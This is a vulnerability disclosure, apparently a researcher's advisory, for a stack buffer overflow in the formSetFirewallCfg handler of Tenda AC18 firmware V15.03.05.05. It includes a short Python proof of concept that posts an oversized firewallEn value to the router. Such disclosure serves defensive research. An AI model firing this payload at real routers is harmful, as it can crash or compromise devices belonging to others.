## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `formSetFirewallCfg` function. The `src` variable receives the `firewallEn` parameter from a POST request and is later assigned to the `dest` variable, which is fixed at 4 bytes. However, since the user can control the input of  `firewallEn`, the statement `strcpy(dest, src);` can cause a buffer overflow. The user-provided  `firewallEn` can exceed the capacity of the `dest` array, triggering this security vulnerability.

![image-20240305233936132](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305233936132.png)

![image-20240305234104657](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305234104657.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetFirewallCfg"
payload = b"a"*1000

data = {"firewallEn": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240305233859512](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305233859512.png)
